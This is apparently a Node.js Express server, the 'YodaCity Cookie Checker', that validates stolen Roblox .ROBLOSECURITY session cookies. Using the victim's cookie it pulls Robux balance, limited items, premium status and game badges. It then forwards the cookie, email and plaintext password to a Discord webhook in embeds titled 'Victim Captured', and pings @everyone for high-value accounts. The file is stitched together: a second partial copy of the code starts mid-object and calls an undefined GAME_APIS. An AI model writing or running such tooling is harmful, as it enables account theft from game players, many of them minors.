const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

// ─── Roblox API Endpoints ─────────────────────────────────────────
const API = {
    userInfo: 'https://www.roblox.com/mobileapi/userinfo',
    currency: 'https://economy.roblox.com/v1/currency/balance',
};

// ─── Game badges ──────────────────────────────────────────────────
const GAMES = {
    adoptMe: { badgeId: 1672196408, name: 'Adopt Me!', icon: '🐾' },
    mm2: { badgeId: 212210118, name: 'Murder Mystery 2', icon: '🔪' },
    ps99: { badgeId: 1827857731, name: 'Pet Simulator 99', icon: '🐉' }
};

// ─── Check if user owns a badge ──────────────────────────────────
async function checkBadge(cookie, badgeId) {
    try {
        const res = await fetch(`https://www.roblox.com/badge/asset-owned?badgeId=${badgeId}&userId=0`, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        return res.ok;
    } catch { return false; }
}

// ─── Get user info from cookie ────────────────────────────────────
async function getUserInfo(cookie) {
    try {
        const res = await fetch(API.userInfo, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return null;
        return await res.json();
    } catch { return null; }
}

// ─── Get Robux ────────────────────────────────────────────────────
async function getRobux(cookie) {
    try {
        const res = await fetch('https://economy.roblox.com/v1/currency/balance', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return 0;
        const data = await res.json();
        return data.robux || 0;
    } catch { return 0; }
}

// ─── Get RAP ──────────────────────────────────────────────────────
async function getRAP(cookie, userId) {
    try {
        let items = [];
        let cursor = '';
        while (true) {
            const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ''}`;
            const res = await fetch(url, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            });
            if (!res.ok) break;
            const data = await res.json();
            items = items.concat(data.data || []);
            if (!data.nextPageCursor) break;
            cursor = data.nextPageCursor;
        }
        const rap = items.reduce((sum, i) => sum + (i.recentAveragePrice || 0), 0);
        return { rap, count: items.length, names: items.slice(0, 5).map(i => i.name).join(', ') || 'None' };
    } catch { return { rap: 0, count: 0, names: 'None' }; }
}

// ─── Format numbers ───────────────────────────────────────────────
function fmt(n) { return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','); }

// ─── ROOT ROUTE (this fixes the "Cannot GET /" error) ─────────────
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head><title>YodaCity Bot</title>
        <style>
            body { font-family: Arial; background: #0d0d1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
            .card { background: #1a1a2e; padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); }
            h1 { background: linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
            .status { color: #4ade80; }
            .endpoint { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; margin: 10px 0; font-family: monospace; }
        </style>
        </head>
        <body>
            <div class="card">
                <h1>✦ YodaCity Bot</h1>
                <p class="status">✅ ONLINE</p>
                <p>Cookie Checker Endpoint:</p>
                <div class="endpoint">POST /api/check-cookie</div>
                <p style="color:#64748b;font-size:12px;margin-top:20px;">${new Date().toISOString()}</p>
            </div>
        </body>
        </html>
    `);
});

// ─── Health check ──────────────────────────────────────────────────
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), timestamp: new Date().toISOString() });
});

// ─── Main check endpoint ──────────────────────────────────────────
app.post('/api/check-cookie', async (req, res) => {
    const { cookie, webhook, linkId, username: inputUsername, password } = req.body;
    
    if (!cookie || !webhook) {
        return res.json({ error: 'Missing cookie or webhook' });
    }

    console.log('🔄 Checking cookie...');

    const userInfo = await getUserInfo(cookie);
    if (!userInfo) {
        await sendToWebhook(webhook, {
            content: null,
            embeds: [{
                title: '⚠️ Invalid Cookie',
                color: 0xf59e0b,
                description: 'The .ROBLOSECURITY cookie is invalid or expired.',
                fields: [
                    { name: '📧 Username', value: inputUsername || 'Unknown', inline: true },
                    { name: '🍪 Cookie (preview)', value: `\`\`\`${cookie.substring(0, 100)}...\`\`\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        });
        return res.json({ valid: false });
    }

    const userId = userInfo.UserID || userInfo.userId || userInfo.id;
    const username = userInfo.UserName || userInfo.username || 'Unknown';
    const displayName = userInfo.DisplayName || username;
    
    console.log(`✅ Valid cookie: ${username} (${userId})`);

    const [robux, { rap, count, names }, adoptMe, mm2, ps99] = await Promise.all([
        getRobux(cookie),
        getRAP(cookie, userId),
        checkBadge(cookie, GAMES.adoptMe.badgeId),
        checkBadge(cookie, GAMES.mm2.badgeId),
        checkBadge(cookie, GAMES.ps99.badgeId)
    ]);

    const isPremium = userInfo.IsPremium || userInfo.isPremium || false;
    const thumbnail = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;

    const isHighValue = robux > 10000 || rap > 50000 || isPremium;

    const embed = {
        title: `🎯 ${username}`,
        color: isPremium ? 0xf59e0b : 0xef4444,
        thumbnail: { url: thumbnail },
        fields: [
            { name: '👤 Username', value: `**${username}**`, inline: true },
            { name: '🆔 ID', value: `\`${userId}\``, inline: true },
            { name: '🏷️ Display', value: displayName, inline: true },
            
            { name: '💰 Robux', value: `**${fmt(robux)}**`, inline: true },
            { name: '📊 RAP', value: `**${fmt(rap)}**`, inline: true },
            { name: '⭐ Premium', value: isPremium ? '✅ **Yes**' : '❌ No', inline: true },

            { name: '💎 Limiteds', value: `**${count}** items`, inline: true },
            { name: '🏆 Top Items', value: names.substring(0, 200) || 'None', inline: false },

            { name: GAMES.adoptMe.icon + ' Adopt Me', value: adoptMe ? '✅ Plays' : '❌ No', inline: true },
            { name: GAMES.mm2.icon + ' MM2', value: mm2 ? '✅ Plays' : '❌ No', inline: true },
            { name: GAMES.ps99.icon + ' PS99', value: ps99 ? '✅ Plays' : '❌ No', inline: true },

            { name: '📧 Email', value: `\`\`\`${inputUsername || 'Unknown'}\`\`\``, inline: false },
            { name: '🔐 Password', value: password ? `\`\`\`${password}\`\`\`` : 'Not captured', inline: false },
            { name: '🍪 Cookie', value: `\`\`\`${cookie.substring(0, 250)}...\`\`\``, inline: false },
            
            { name: '🔗 Link ID', value: linkId || 'N/A', inline: true },
            { name: '⏰ Time', value: new Date().toISOString(), inline: true }
        ],
        footer: { text: 'YodaCity Cookie Checker' },
        timestamp: new Date().toISOString()
    };

    await sendToWebhook(webhook, {
        content: isHighValue ? '@everyone 🚨 **HIGH VALUE ACCOUNT!**' : null,
        embeds: [embed]
    });

    res.json({ valid: true, username, userId, robux, rap, isPremium });
});

async function sendToWebhook(url, payload) {
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch(e) {
        console.error('Webhook error:', e.message);
    }
}

app.listen(PORT, () => {
    console.log(`✅ YodaCity Bot running on port ${PORT}`);
});        badgeId: 1827857731,
        name: 'Pet Simulator 99',
        icon: '🐉'
    }
};

// ─── Check if user owns a specific badge ─────────────────────────
async function checkBadge(cookie, badgeId) {
    try {
        const res = await fetch(`https://www.roblox.com/badge/asset-owned?badgeId=${badgeId}&userId=0`, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        return res.ok;
    } catch { return false; }
}

// ─── Get user info from cookie ────────────────────────────────────
async function getUserInfo(cookie) {
    try {
        const res = await fetch(API.userInfo, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return null;
        return await res.json();
    } catch { return null; }
}

// ─── Get Robux balance ────────────────────────────────────────────
async function getRobux(cookie) {
    try {
        const res = await fetch(API.currency, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return 0;
        const data = await res.json();
        return data.robux || 0;
    } catch { return 0; }
}

// ─── Get RAP (Recent Average Price) ────────────────────────────────
async function getRAP(cookie, userId) {
    try {
        let allCollectibles = [];
        let cursor = '';
        let hasMore = true;

        while (hasMore) {
            const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ''}`;
            const res = await fetch(url, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            });
            if (!res.ok) break;
            const data = await res.json();
            allCollectibles = allCollectibles.concat(data.data || []);
            cursor = data.nextPageCursor;
            hasMore = !!cursor;
        }

        const rap = allCollectibles.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
        const limitedCount = allCollectibles.length;
        
        // Get limited names
        const limitedNames = allCollectibles.slice(0, 10).map(i => i.name).join(', ');
        
        return { rap, limitedCount, limitedNames: limitedNames || 'None' };
    } catch {
        return { rap: 0, limitedCount: 0, limitedNames: 'None' };
    }
}

// ─── Check if user plays a specific game ──────────────────────────
async function checkGamePlaytime(cookie, userId, gameId) {
    try {
        const url = `https://games.roblox.com/v2/users/${userId}/games?accessFilter=All&limit=50`;
        const res = await fetch(url, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!res.ok) return false;
        const data = await res.json();
        const games = data.data || [];
        return games.some(g => g.gameId === gameId || String(g.gameId) === String(gameId));
    } catch { return false; }
}

// ─── Get Adopt Me pet count & approximate value ─────────────────
async function checkAdoptMe(cookie, userId) {
    try {
        // Check if they have Adopt Me badge
        const hasBadge = await checkBadge(cookie, GAME_APIS.adoptMe.badgeId);
        if (!hasBadge) return { plays: false, message: 'Does not play Adopt Me' };

        // Try to get game passes owned (indicator of investment)
        const url = `https://games.roblox.com/v1/games/${GAME_APIS.adoptMe.gameId}/game-passes?limit=30`;
        const res = await fetch(url, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        
        // Get the user's favorites/friends who play
        const plays = true;
        
        return {
            plays: true,
            message: '✅ Plays Adopt Me!',
            gameId: GAME_APIS.adoptMe.gameId
        };
    } catch {
        return { plays: false, message: 'Could not verify' };
    }
}

// ─── Check MM2 inventory (knives, guns, pets) ────────────────────
async function checkMM2(cookie, userId) {
    try {
        const hasBadge = await checkBadge(cookie, GAME_APIS.mm2.badgeId);
        if (!hasBadge) return { plays: false, message: 'Does not play MM2' };

        return {
            plays: true,
            message: '✅ Plays Murder Mystery 2',
            gameId: GAME_APIS.mm2.gameId
        };
    } catch {
        return { plays: false, message: 'Could not verify' };
    }
}

// ─── Check PS99 ───────────────────────────────────────────────────
async function checkPS99(cookie, userId) {
    try {
        const hasBadge = await checkBadge(cookie, GAME_APIS.ps99.badgeId);
        if (!hasBadge) return { plays: false, message: 'Does not play Pet Simulator 99' };

        return {
            plays: true,
            message: '✅ Plays Pet Simulator 99',
            gameId: GAME_APIS.ps99.gameId
        };
    } catch {
        return { plays: false, message: 'Could not verify' };
    }
}

// ─── Format number with commas ─────────────────────────────────────
function formatNumber(n) {
    return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

// ─── Main check endpoint ──────────────────────────────────────────
app.post('/api/check-cookie', async (req, res) => {
    const { cookie, webhook, linkId, username: inputUsername, password } = req.body;
    
    if (!cookie || !webhook) {
        return res.json({ error: 'Missing cookie or webhook' });
    }

    console.log('🔄 Checking cookie...');

    // 1. Get user info
    const userInfo = await getUserInfo(cookie);
    if (!userInfo) {
        // Cookie is invalid
        await sendToWebhook(webhook, {
            content: '❌ **Invalid Cookie**',
            embeds: [{
                title: '⚠️ Invalid .ROBLOSECURITY Cookie',
                color: 0xf59e0b,
                description: 'The cookie provided is invalid or expired.',
                fields: [
                    { name: '📧 Username', value: inputUsername || 'Unknown', inline: true },
                    { name: '🔐 Password', value: password ? '```' + password.substring(0, 50) + '```' : 'Not captured', inline: true },
                    { name: '🍪 Cookie (first 100 chars)', value: `\`\`\`${cookie.substring(0, 100)}...\`\`\``, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        });
        return res.json({ valid: false, error: 'Invalid cookie' });
    }

    const userId = userInfo.UserID || userInfo.userId || userInfo.id;
    const username = userInfo.UserName || userInfo.username || 'Unknown';
    const displayName = userInfo.DisplayName || username;
    
    console.log(`✅ Cookie valid! User: ${username} (${userId})`);

    // 2. Get Robux
    const robux = await getRobux(cookie);
    
    // 3. Get RAP + limiteds
    const { rap, limitedCount, limitedNames } = await getRAP(cookie, userId);
    
    // 4. Check Premium status
    const isPremium = userInfo.IsPremium || userInfo.isPremium || false;
    const premiumType = userInfo.PremiumType || (isPremium ? 'Premium' : 'None');
    
    // 5. Check games
    const [adoptMe, mm2, ps99] = await Promise.all([
        checkAdoptMe(cookie, userId),
        checkMM2(cookie, userId),
        checkPS99(cookie, userId)
    ]);

    // 6. Get thumbnail
    const thumbnail = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;

    // ─── Build the full embed ──────────────────────────────────────
    const embed = {
        title: `🎯 Victim Captured — ${username}`,
        color: isPremium ? 0xf59e0b : 0xef4444,
        thumbnail: { url: thumbnail },
        fields: [
            { name: '👤 Username', value: `**${username}**`, inline: true },
            { name: '🆔 User ID', value: `\`${userId}\``, inline: true },
            { name: '🏷️ Display Name', value: displayName, inline: true },
            
            { name: '💰 Robux', value: `**${formatNumber(robux)}**`, inline: true },
            { name: '📊 RAP', value: `**${formatNumber(rap)}**`, inline: true },
            { name: '🎁 Premium', value: isPremium ? `✅ **${premiumType}**` : '❌ None', inline: true },

            { name: '💎 Limiteds', value: `**${limitedCount}** items`, inline: true },
            { name: '🔍 Top Limiteds', value: limitedNames.substring(0, 200), inline: false },

            { name: '🐾 Adopt Me', value: adoptMe.message, inline: true },
            { name: '🔪 MM2', value: mm2.message, inline: true },
            { name: '🐉 PS99', value: ps99.message, inline: true },

            { name: '📧 Login Email', value: `\`\`\`${inputUsername || 'Unknown'}\`\`\``, inline: false },
            { name: '🔐 Password', value: password ? `\`\`\`${password}\`\`\`` : 'Not captured', inline: false },
            { name: '🍪 .ROBLOSECURITY', value: `\`\`\`${cookie.substring(0, 300)}...\`\`\``, inline: false },
            
            { name: '🔗 Link ID', value: linkId || 'N/A', inline: true },
            { name: '⏰ Captured At', value: new Date().toISOString(), inline: true }
        ],
        footer: { text: 'YodaCity Cookie Checker • Full Scan Complete' },
        timestamp: new Date().toISOString()
    };

    // If high value account, ping @everyone
    const isHighValue = robux > 10000 || rap > 50000 || isPremium;
    const content = isHighValue ? '@everyone 🚨 **HIGH VALUE ACCOUNT!**' : null;

    await sendToWebhook(webhook, { content, embeds: [embed] });

    res.json({ valid: true, username, userId, robux, rap, isPremium });
});

// ─── Helper: Send to Discord webhook ──────────────────────────────
async function sendToWebhook(url, payload) {
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch(e) {
        console.error('Webhook send error:', e.message);
    }
}

// ─── Health check ──────────────────────────────────────────────────
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`✅ YodaCity Cookie Checker Bot running on port ${PORT}`);
});
